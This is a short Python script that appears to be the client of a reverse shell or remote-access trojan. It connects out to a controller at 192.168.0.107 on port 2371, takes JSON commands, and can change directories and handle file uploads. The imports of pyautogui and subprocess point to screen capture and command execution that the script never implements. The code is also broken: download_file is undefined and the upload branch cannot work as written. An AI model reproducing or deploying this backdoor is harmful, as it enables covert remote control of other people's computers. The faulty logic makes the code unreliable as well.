import socket, json, subprocess, os, pyautogui

def data_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        comm = data_recv()
        if comm == 'exit':
            break
        elif comm == 'clear':
            pass
        elif comm[:3] == 'cd ':
            os.chdir(comm[3:])
        elif comm == 'upload':
            download_file(comm[7:])



soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('192.168.0.107', 2371))
shell()